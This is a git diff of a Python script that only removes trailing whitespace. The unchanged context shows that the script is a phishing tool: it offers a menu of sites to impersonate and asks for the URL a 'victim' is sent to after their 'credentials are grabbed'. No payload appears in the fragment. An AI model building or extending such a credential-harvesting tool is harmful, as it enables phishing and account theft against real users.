@@ -108,14 +108,14 @@ def split_block(lst, se):
             lst.append("arb")
     sublists=[]
     to_split = []
-    
+
     for index in range(len(lst)+1):
         if index%se==0:
             to_split.append(index)
     for index in range(len(to_split)-1):
         sublists.append(lst[to_split[index]:to_split[index+1]])
     final = []
-    
+
     for index in sublists:
         if "arb" in index:
             while 'arb' in index:
@@ -123,8 +123,8 @@ def split_block(lst, se):
         if not index==[]:
             final.append(index)
     return final
-    
-for site in split_block(list(siteLookUp.keys()), 6): 
+
+for site in split_block(list(siteLookUp.keys()), 6):
     for number in site:
 
 #### Clears the console and prints the ASCII art
@@ -140,7 +140,7 @@ while True:
         break
     except (ValueError, TypeError):
         print(Fore.RED + 'Please choose a valid site.')
-        
+
 
 #### Selects the vicitim would be redirected to after the credientials are grabbed
 redirect_url = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Enter redirect URL:" + Fore.YELLOW + f" ({siteDefaultRedirect[site]})" + Fore.GREEN + ": ") or siteDefaultRedirect[site]
